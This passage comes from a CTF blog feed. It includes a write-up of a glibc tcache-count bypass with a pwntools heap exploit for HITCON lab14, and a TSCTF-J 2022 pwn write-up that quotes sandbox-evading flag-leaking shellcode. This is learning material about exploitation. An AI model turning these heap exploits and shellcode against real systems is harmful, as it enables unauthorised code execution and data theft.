punctuation">)</span></code></pre><p>于是我们便在源码中寻找各变量的定义<br>tcache_perthread_struct结构体中定义了char 类型的counts数组</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct<span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre><p>glibc中并没有给出mp_.tcache_count的类型定义，不过我们可通过这一赋值操作推出mp_.tcache_count是size_t类型，而size_t在大部分机器上是无符号整型</p><pre class=" language-c"><code class="language-c"><span class="token function">do_set_tcache_count</span> <span class="token punctuation">(</span>size_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tunable_tcache_count<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">;</span>  mp_<span class="token punctuation">.</span>tcache_count <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>于是counts是char类型，mp_.tcache_count是size_t类型，在比较时会发生整型提升，故若能使counts为一个负数，便可绕过这一判断<br>那有没有办法使counts变为一个负数呢？答案是有，可以通过整数溢出做到<br>在tcache_get中存在对counts域的–操作，于是只要从Tcache中分配出的chunk数量大于释放进Tcache的数量，便可使counts变为一个负数</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对于上述操作，可以通过Tcache Poisoning技术做到(即伪造一个Tcache中的chunk,且由于Tcache分配时无对size域的检查,使这一操作能够轻松完成)<br>到此我们便完成了Tcache机制的绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这一绕过方法得益于glibc2.26-2.27中tcache_get函数的错误assert操作</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第二个断言的内容是错误的，本意应该是检查counts的符号</span>  <span class="token comment" spellcheck="true">//即assert(tcache->counts[tc_idx]>0);</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这一漏洞已在glibc2.28后的版本中修复</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>看起来感觉挺鸡肋，但是大多数题目会限制分配堆块的大小和数量，此时前两个绕过方法便已失效,这一方法便有了用武之地</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>还是以Unsortedbin Attack的经典题hitcontraining_lab14为例</p><h4 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ol><li>题目中edit_heap函数没有对size的限制存在堆溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap2.png"></li><li>若bss段变量magic&gt;4869即可执行后门函数<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap1.png"><br>所以就是Unsortedbin Attack修改magic的值</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magicheap'</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>tcache_poisoning <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>tcache_poisoning<span class="token punctuation">)</span><span class="token punctuation">,</span>tcache_poisoning<span class="token punctuation">)</span>  create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#此时Tcache的counts域已为-1，完成绕过</span>  create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 防止与top chunk合并</span><span class="token comment" spellcheck="true">#Unsortedbin Attack</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> magic<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>文中提出的这一绕过方法利用价值不大，但这也是我第一次通过源码来分析问题，还是有一点纪念意义的<br>我倒是希望在以后的做题中能有这一绕过方法的用武之地吧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF-J</title>
      <link href="/2022/11/09/2022tsctf-j-writeup-2022.10.17/"/>
      <url>/2022/11/09/2022tsctf-j-writeup-2022.10.17/</url>
      
        <content type="html"><![CDATA[<p>[[PWN ？！]]<br>[[PWN生涯]]</p><ul><li><h3 id="–writeby-HanQi"><a href="#–writeby-HanQi" class="headerlink" title="–writeby__HanQi"></a>–writeby__HanQi</h3></li><li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1>算是正式做的第一次比赛吧，啥也不会坐牢四天（悲<br>题目难度感觉还好(不会做都是我太菜)（比moe或hn难一点？至少pwn题是这样<br>也是第一次写wp，认真写一下留个纪念</li><li><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><h2 id="checkin-stackoverflow"><a href="#checkin-stackoverflow" class="headerlink" title="checkin(stackoverflow)"></a>checkin(stackoverflow)</h2><ul><li><h3 id="checksec-IDA"><a href="#checksec-IDA" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>栈溢出覆盖ch_0的值就好了</li><li><img src="https://i.niupic.com/images/2022/10/17/a9tq.png"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tr.png"></li></ul></li><li><h2 id="ヰ世界転生-int-overflow-ret2text"><a href="#ヰ世界転生-int-overflow-ret2text" class="headerlink" title="ヰ世界転生(int overflow+ret2text)"></a>ヰ世界転生(int overflow+ret2text)</h2><ul><li><h3 id="checksec-IDA-1"><a href="#checksec-IDA-1" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>循环lose累积分数<br><img src="https://i.niupic.com/images/2022/10/17/a9tG.png">{:height 992, :width 776}<br>末尾有一个point_checker的函数，进去看一眼，给points设了上限，盲猜是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9ts.png"><br>然后是用分数换技能，前面花里胡哨没啥用（命名竟然比技能贵…<br><img src="https://i.niupic.com/images/2022/10/17/a9tt.png"><br>从有输入的地方开始看，第一次先输入长度nbytes，再第二次输入内容存到buf，对nbytes有长度限制，估计还是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9tH.png"><br>大概逻辑理清后来找一找后门函数或’/bin/sh’（其实一来就该找？<br><img src="https://i.niupic.com/images/2022/10/17/a9ty.png"><br>再关注一下刚刚发现的两个整形溢出点，看一下有无类型转换之类的，还真有<br><img src="https://i.niupic.com/images/2022/10/17/a9tz.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tM.png"></li><li><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tv.png"></li></ul></li><li><h2 id="ret2shellcode-orw"><a href="#ret2shellcode-orw" class="headerlink" title="ret2shellcode(orw)"></a>ret2shellcode(orw)</h2><ul><li><h3 id="checksec-IDA-gdb"><a href="#checksec-IDA-gdb" class="headerlink" title="checksec+IDA+gdb"></a>checksec+IDA+gdb</h3>大概流程就是mmap分配一个可写可执行的空间，让你写入code并执行<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>尝试shellcraft.sh()后未成功，gdb调试发现系统调用时进程崩溃,显示“bad syscall” 搜索后发现有沙盒<br>第一次见 并在init函数里发现函数prctl 禁止了execve调用，仅允许open、read、write读取flag<br><img src="https://i.niupic.com/images/2022/10/17/a9tN.png"></li><li><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>利用pwntools写orw的汇编，发现长度过长，只能手写<br><img src="https://i.niupic.com/images/2022/10/17/a9tx.png"><br>换成如下(其实还是网上找的code,原code还是长了,在出题人提示下删掉了重复的参数布置过程)<br><img src="https://i.niupic.com/images/2022/10/17/a9tO.png"></li></ul></li><li><h2 id="ASCII-ART-partial-overwrite"><a href="#ASCII-ART-partial-overwrite" class="headerlink" title="ASCII_ART(partial overwrite)"></a>ASCII_ART(partial overwrite)</h2><ul><li><h3 id="checksec-IDA-2"><a href="#checksec-IDA-2" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>简洁的main函数（并不影响我看不懂<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>找找后门，有好东西<br><img src="https://i.niupic.com/images/2022/10/17/a9tQ.png"><br>gdb发现输入是可以覆盖返回地址的，再加上开了pie，那就是partial overwrite<br><img src="https://i.niupic.com/images/2022/10/17/a9tE.png"></li><li><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tA.png"></li></ul></li><li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li><li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul><li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li><li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li></ul></li></ul><h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3><p>  ```python<br>sc = “””<br>lea rsp, [rip+0x500]<br>lea r13, [rip]<br>mov r14, 0xfffffff00000<br>and r13, r14 # 使r13页对齐<br>loop:<br>  add r13, 0x1000<br>  pop r14 #回收上一次push的r13地址<br>  pop r14<br>  push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_len<br>  push r13<br>  mov rdi, 2<br>  mov rsi, rsp<br>  mov rdx, 1<br>  mov rcx, 0<br>  mov rax, 20<br>  syscall<br>  cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读<br>  jl loop # 若不可读再次循环<br>mov rdi, [r13]<br>cmp edi, 0x54435354 #判断字符串是否以TSCT开头<br>jnz loop<br>push 31<br>push r13<br>mov rdi, 2<br>mov rsi, rsp<br>mov rdx, 1<br>mov rcx, 0<br>mov rax, 20<br>syscall #打印flag<br>jmp $<br>“””</p></li></ul><p>```<br>    - ### question<br>        这个地方的文件描述符错误应该是2，系统调用可用writev<br>          <img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><br>        - ## 堆相关<br>          其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</p><ul><li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
